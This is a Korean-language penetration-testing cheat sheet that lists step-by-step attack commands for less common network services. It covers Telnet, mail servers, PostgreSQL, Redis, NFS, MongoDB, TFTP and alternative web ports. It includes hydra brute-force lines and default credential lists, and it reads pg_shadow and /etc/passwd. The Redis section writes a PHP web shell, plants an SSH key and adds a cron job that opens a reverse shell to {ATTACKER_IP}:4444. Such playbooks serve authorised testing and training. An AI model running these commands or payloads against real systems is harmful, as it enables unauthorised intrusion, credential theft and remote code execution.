# 🔧 OTHER PORTS ATTACKS

> **목표: 기타 포트 발견시 빠른 확인 및 공격으로 추가 공격 벡터 확보**

## ⚡ 즉시 실행할 명령어들

### 🚀 발견 즉시 포트별 기본 확인

```bash
# 모든 기타 포트 한번에 스캔
nmap -sV -p 23,69,79,110,111,143,512,513,514,873,993,995,1521,2049,5432,6379,8080,8443,10000,11211,27017 {IP}

# 버전 정보와 함께 상세 스캔
nmap -sC -sV -p {PORT} {IP}

# 해당 포트 기본 연결 테스트
nc -nv {IP} {PORT}
telnet {IP} {PORT}
```

---

## 📋 단계별 체크리스트

### 🎯 Phase 1: 포트 식별 및 기본 정보 (5분)

- [ ] **전체 포트 스캔으로 기타 포트 발견**
- [ ] **서비스 및 버전 확인**
- [ ] **배너 그래빙**
- [ ] **해당 서비스 특성 파악**
- [ ] **공격 우선순위 결정**

### 🔍 Phase 2: 서비스별 열거 (10분)

- [ ] **익명 접근 시도**
- [ ] **기본 자격증명 시도**
- [ ] **서비스별 전용 명령어 실행**
- [ ] **설정 정보 수집**
- [ ] **취약점 스캔**

### 💥 Phase 3: 공격 시도 (10분)

- [ ] **알려진 취약점 확인**
- [ ] **브루트포스 공격**
- [ ] **설정 오류 악용**
- [ ] **파일 접근 시도**
- [ ] **명령 실행 시도**

### 🎯 Phase 4: 결과 활용 (5분)

- [ ] **수집된 정보 분석**
- [ ] **다른 서비스와 연계**
- [ ] **크레덴셜 정보 활용**
- [ ] **추가 공격 준비**

---

## 🎯 상황별 대응

### 📞 TELNET (Port 23)

```bash
# 기본 연결
telnet {IP} 23

# 배너 그래빙
nc -nv {IP} 23

# 기본 자격증명 시도
# 연결 후: admin/admin, root/root, admin/password

# Cisco 장비 (일반적)
# Username: cisco, Password: cisco
# Username: admin, Password: admin

# 브루트포스
hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://{IP}
hydra -L users.txt -P passwords.txt telnet://{IP}

# Nmap 스크립트
nmap --script telnet-brute -p 23 {IP}
nmap --script telnet-ntlm-info -p 23 {IP}
```

### 📧 POP3/IMAP (Port 110/143/993/995)

```bash
# POP3 (110) 기본 연결
telnet {IP} 110
nc -nv {IP} 110

# POP3 명령어
USER username
PASS password
LIST
RETR 1
QUIT

# IMAP (143) 기본 연결
telnet {IP} 143
nc -nv {IP} 143

# IMAP 명령어
LOGIN username password
LIST "" "*"
SELECT INBOX
FETCH 1 BODY[]
LOGOUT

# SSL/TLS 버전 (993 IMAPS, 995 POP3S)
openssl s_client -connect {IP}:993
openssl s_client -connect {IP}:995

# 브루트포스 공격
hydra -l admin -P passwords.txt pop3://{IP}
hydra -l admin -P passwords.txt imap://{IP}

# Nmap 스크립트
nmap --script pop3-brute -p 110 {IP}
nmap --script imap-brute -p 143 {IP}
```

### 🗄️ POSTGRESQL (Port 5432)

```bash
# 기본 연결 시도
psql -h {IP} -U postgres
psql -h {IP} -U postgres -d postgres

# 다른 사용자로 시도
psql -h {IP} -U admin
psql -h {IP} -U user

# 연결 성공시 기본 명령어
\l                     # 데이터베이스 목록
\c database_name      # 데이터베이스 연결
\dt                   # 테이블 목록
\du                   # 사용자 목록
SELECT version();     # 버전 확인

# 중요 시스템 테이블
SELECT * FROM pg_user;
SELECT * FROM pg_shadow;

# 파일 읽기 (슈퍼유저 권한)
SELECT pg_read_file('/etc/passwd');
COPY (SELECT '') TO '/tmp/test.txt';

# 브루트포스
hydra -l postgres -P passwords.txt postgres://{IP}
```

### 🔴 REDIS (Port 6379)

```bash
# 기본 연결 (인증 없음)
redis-cli -h {IP}
nc -nv {IP} 6379

# Redis 명령어
INFO
CONFIG GET "*"
KEYS *
GET key_name

# 파일 쓰기 악용 (인증 없는 경우)
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SET test "<?php system($_GET['cmd']); ?>"
SAVE

# SSH 키 업로드 (홈 디렉토리 쓰기 가능시)
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SET ssh_key "ssh-rsa AAAAB3..."
SAVE

# Cron job 생성 (가능한 경우)
CONFIG SET dir /var/spool/cron/crontabs/
CONFIG SET dbfilename root
SET cron "\n* * * * * /bin/bash -i >& /dev/tcp/{ATTACKER_IP}/4444 0>&1\n"
SAVE
```

### 🌐 ALTERNATIVE WEB PORTS (8080/8443/8000/3000/9000)

```bash
# 기본 웹 서비스 확인
curl -I http://{IP}:8080
curl -I https://{IP}:8443
whatweb http://{IP}:8080

# 일반적인 관리 인터페이스들
curl http://{IP}:8080/manager/html    # Tomcat
curl http://{IP}:8080/admin           # Various
curl http://{IP}:10000                # Webmin

# 디렉토리 스캔
gobuster dir -u http://{IP}:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Jenkins 확인 (8080)
curl http://{IP}:8080/script          # Script console
curl http://{IP}:8080/systemInfo      # System info

# Node.js 앱 확인 (3000, 8000)
curl http://{IP}:3000/package.json    # Package info
```

### 📁 NFS (Port 2049) & RPC (Port 111)

```bash
# RPC 서비스 확인
rpcinfo -p {IP}

# NFS 공유 확인
showmount -e {IP}
nmap --script nfs-showmount -p 111 {IP}

# NFS 마운트
mkdir /mnt/nfs
mount -t nfs {IP}:/shared /mnt/nfs
ls -la /mnt/nfs

# NFS 권한 확인
ls -la /mnt/nfs
id
# UID/GID 조작으로 권한 우회 시도
```

### 💾 MONGODB (Port 27017)

```bash
# 기본 연결 (인증 없음)
mongo {IP}:27017

# MongoDB 명령어
show dbs
use database_name
show collections
db.collection.find()
db.collection.find().limit(5)

# 사용자 정보
db.getUsers()
use admin
db.system.users.find()

# 파일 시스템 접근 (GridFS)
db.fs.files.find()
```

### 🔧 기타 서비스들

```bash
# TFTP (69)
tftp {IP}
get filename
put filename

# Finger (79)
finger @{IP}
finger user@{IP}

# NTP (123)
ntpdate -q {IP}
nmap --script ntp-info -sU -p 123 {IP}

# Memcached (11211)
telnet {IP} 11211
stats
get key

# rsync (873)
rsync --list-only {IP}::
rsync --list-only rsync://{IP}/

# Oracle (1521)
sqlplus system/manager@{IP}:1521/XE
tnscmd10g version -h {IP} -p 1521
```

---

## 🚨 문제 해결

### 🚫 연결 거부시

```bash
# 다른 포트 확인
nmap -p 1-10000 {IP} | grep open

# 서비스 재확인
nmap -sV -p {PORT} {IP}

# UDP 서비스 확인
nmap -sU -p {PORT} {IP}
```

### 🔒 인증 필요시

```bash
# 기본 자격증명 시도 (서비스별)
# PostgreSQL: postgres/postgres, postgres/(empty)
# Redis: (no auth), admin/admin
# MongoDB: (no auth), admin/admin

# 다른 서비스에서 수집한 크레덴셜 재사용
psql -h {IP} -U {SMB_USER} -d postgres
redis-cli -h {IP} -a {WEB_PASSWORD}
```

### 🔍 정보 부족시

```bash
# 더 상세한 스캔
nmap --script "default or safe" -p {PORT} {IP}

# 배너 그래빙
nc -nv {IP} {PORT}
telnet {IP} {PORT}

# 서비스별 전용 도구 사용
```

### 🐌 응답 느릴 때

```bash
# 타임아웃 조정
timeout 10 nc -nv {IP} {PORT}

# 다른 도구 시도
nmap -p {PORT} {IP} --max-retries 1
```

---

## 🔗 다른 서비스와 연계

### 📊 정보 수집 결과 활용

```bash
# 수집된 크레덴셜을 다른 서비스에 시도
# PostgreSQL에서 발견한 크레덴셜 → SSH/SMB 시도
# Redis에서 발견한 정보 → 웹 애플리케이션 공격

# 파일 접근 권한으로 다른 서비스 공격
# NFS 마운트로 SSH 키 확인
# Redis로 웹쉘 업로드
```

### 🌐 웹 서비스 연계

```bash
# 대체 웹 포트에서 관리 인터페이스 발견
# Jenkins Script Console → 시스템 명령 실행
# Webmin → 직접 시스템 관리
# Tomcat Manager → WAR 파일 업로드
```

---

## 🛠️ 포트별 우선순위 가이드

### 🔥 High Priority (즉시 공격)

```bash
# 8080, 8443 (Alternative Web) - 관리 인터페이스 가능성
# 6379 (Redis) - 인증 없으면 즉시 RCE 가능
# 5432 (PostgreSQL) - 파일 읽기/쓰기 가능
# 27017 (MongoDB) - 인증 없으면 데이터 접근
```

### 🟡 Medium Priority (정보 수집)

```bash
# 110, 143 (Email) - 크레덴셜 정보 수집
# 2049 (NFS) - 파일 시스템 접근
# 23 (Telnet) - 네트워크 장비 관리
```

### 🟢 Low Priority (시간 여유시)

```bash
# 79 (Finger) - 사용자 정보
# 123 (NTP) - 시스템 정보
# 11211 (Memcached) - 캐시 정보
```

---

## ⏱️ 시간 관리 가이드

### 🎯 각 포트당 할당 시간

- **High Priority**: 15-20분
- **Medium Priority**: 10-15분
- **Low Priority**: 5-10분

### 🔍 빠른 확인 체크리스트 (5분)

- [ ] 포트 서비스 확인
- [ ] 익명 접근 시도
- [ ] 기본 자격증명 시도
- [ ] 즉시 활용 가능한 취약점 확인

### 💥 성공 기준

**즉시 다음 단계로:**

- [ ] 파일 시스템 접근 권한 확보
- [ ] 명령 실행 권한 확보
- [ ] 중요 크레덴셜 정보 발견
- [ ] 다른 서비스 공격에 활용할 정보 수집

**다음 단계**:

- 파일 접근 성공시 SSH 키, 설정 파일 등 중요 정보 수집
- 명령 실행 성공시 `SHELLS/reverse-shells.md`로 쉘 획득
- 크레덴셜 수집시 주요 서비스(SSH, SMB, RDP, WinRM) 공격
- 정보 부족시 다른 포트로 이동
